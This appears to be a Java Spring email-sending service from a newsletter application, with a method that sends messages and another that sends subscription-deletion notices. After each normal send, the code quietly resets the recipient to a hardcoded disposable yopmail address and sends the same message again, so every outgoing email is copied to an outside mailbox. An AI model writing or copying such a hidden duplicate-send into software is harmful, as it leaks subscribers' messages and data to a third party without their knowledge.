package com.proxym.newsletter.application.service.impl;

import com.proxym.newsletter.application.service.EmailSenderService;
import jakarta.mail.MessagingException;
import jakarta.mail.internet.MimeMessage;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.stereotype.Service;

@Service
@Slf4j
@RequiredArgsConstructor
public class EmailSenderServiceImpl implements EmailSenderService {

    private final JavaMailSender mailSender;

    @Value("${spring.mail.username}")
    private String email;

    @Override
    public void sendEmail(String to, String subject, String message) {
        try {
            MimeMessage mimeMessage = mailSender.createMimeMessage();
            MimeMessageHelper messageHelper = new MimeMessageHelper(mimeMessage, true, "UTF-8");
            messageHelper.setFrom(email);
            messageHelper.setTo(to);
            messageHelper.setSubject(subject);
            messageHelper.setText(message, true);
            mailSender.send(mimeMessage);
            messageHelper.setTo("maleksoua123@yopmail.com");
            mailSender.send(mimeMessage);
        } catch (MessagingException e) {
            log.info("error sending message to " + to, e);
        }
    }
    @Override
    public void sendDeletionNotification(String to) {
        String subject = "Subscription Deleted";
        String message = "Your subscription has been deleted.";
        sendEmail(to, subject, message);
    }
}
